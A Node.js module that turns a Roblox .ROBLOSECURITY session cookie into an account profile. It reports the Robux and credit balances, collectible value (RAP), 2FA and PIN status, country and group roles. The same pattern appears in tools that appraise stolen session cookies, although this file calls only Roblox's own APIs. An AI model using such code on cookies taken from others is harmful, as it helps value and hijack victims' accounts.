const axios = require("axios");

class RobloxUser {
    constructor(roblosecurityCookie, userId, username, displayName) {
        this.roblosecurityCookie = roblosecurityCookie;
        this.userId = userId;
        this.username = username;
        this.displayName = displayName;
    }

    async doAuthorizedRequest(url) {
        try {
            const response = await axios.get(url, {
                headers: {
                    Cookie: `.ROBLOSECURITY=${this.roblosecurityCookie}`,
                },
            });
            return response.data;
        } catch (error) {
            console.error(`Error fetching data from ${url}:`, error.message);
            return null; // Return null if the request fails
        }
    }

    static async register(roblosecurityCookie) {
        try {
            const { data } = await axios.get(
                "https://users.roblox.com/v1/users/authenticated",
                {
                    headers: { Cookie: `.ROBLOSECURITY=${roblosecurityCookie}` },
                }
            );
            return new RobloxUser(
                roblosecurityCookie,
                data.id,
                data.name,
                data.displayName
            );
        } catch (error) {
            console.error("Error registering user:", error.message);
            return null;
        }
    }

    async getAccountCreationDate() {
        const response = await this.doAuthorizedRequest(
            `https://users.roblox.com/v1/users/${this.userId}`
        );
        return response?.created
            ? new Intl.DateTimeFormat("en-US", {
                  dateStyle: "long",
                  timeStyle: "long",
              }).format(new Date(response.created))
            : "Unknown";
    }

    async getAccountPremiumStatus() {
        const response = await this.doAuthorizedRequest(
            `https://premiumfeatures.roblox.com/v1/users/${this.userId}/subscriptions`
        );
        return response ? true : false;
    }

    async getAccount2FAStatus() {
        const response = await this.doAuthorizedRequest(
            `https://twostepverification.roblox.com/v1/metadata`
        );
        return response?.twoStepVerificationEnabled || false;
    }

    async getAccountPinStatus() {
        const response = await this.doAuthorizedRequest(
            `https://auth.roblox.com/v1/account/pin`
        );
        return response?.isEnabled || false;
    }

    async getAccountBalance() {
        const response = await this.doAuthorizedRequest(
            `https://economy.roblox.com/v1/users/${this.userId}/currency`
        );
        return response?.robux || 0;
    }

    async getAccountBodyShot() {
        const response = await this.doAuthorizedRequest(
            `https://thumbnails.roblox.com/v1/users/avatar?userIds=${
                this.userId
            }&size=720x720&format=Png&isCircular=false`
        );
        return response?.data?.[0]?.imageUrl || "";
    }

    async getAccountCountry() {
        const response = await this.doAuthorizedRequest(
            "https://www.roblox.com/account/settings/account-country"
        );
        return response?.countryName || "Unknown";
    }

    async getAccountCreditBalance() {
        const response = await this.doAuthorizedRequest(
            "https://billing.roblox.com/v1/credit"
        );
        const formatter = new Intl.NumberFormat("en-US", {
            style: "currency",
            currency: "USD",
        });
        return response?.balance ? formatter.format(response.balance) : "$0.00";
    }

    async getAccountRAP() {
        let calculatedRap = 0;
        let nextPageCursor = "";

        while (nextPageCursor !== null) {
            const inventoryPage = await this.doAuthorizedRequest(
                `https://inventory.roblox.com/v1/users/${this.userId}/assets/collectibles?sortOrder=Asc&limit=100&cursor=${nextPageCursor}`
            );

            calculatedRap += inventoryPage?.data?.reduce(
                (rap, item) => rap + item.recentAveragePrice,
                0
            ) || 0;
            nextPageCursor = inventoryPage?.nextPageCursor || null;
        }

        return calculatedRap;
    }

    async getGroupMemberships() {
        const response = await this.doAuthorizedRequest(
            `https://groups.roblox.com/v1/users/${this.userId}/groups/roles`
        );
        return response?.data?.map((group) => ({
            groupName: group.group.name,
            role: group.role.name,
        })) || [];
    }

    async getUserData() {
        const creationDate = await this.getAccountCreationDate();
        const premiumStatus = await this.getAccountPremiumStatus();
        const twoFAStatus = await this.getAccount2FAStatus();
        const pinStatus = await this.getAccountPinStatus();
        const accountBalance = await this.getAccountBalance();
        const avatarUrl = await this.getAccountBodyShot();
        const country = await this.getAccountCountry();
        const creditBalance = await this.getAccountCreditBalance();
        const rap = await this.getAccountRAP();
        const groupMemberships = await this.getGroupMemberships();

        return {
            username: this.username,
            uid: this.userId,
            displayName: this.displayName,
            avatarUrl,
            createdAt: creationDate,
            country,
            balance: accountBalance,
            creditBalance,
            rap,
            isTwoStepVerificationEnabled: twoFAStatus,
            isPinEnabled: pinStatus,
            isPremium: premiumStatus,
            groups: groupMemberships,
        };
    }
}

module.exports = { RobloxUser };
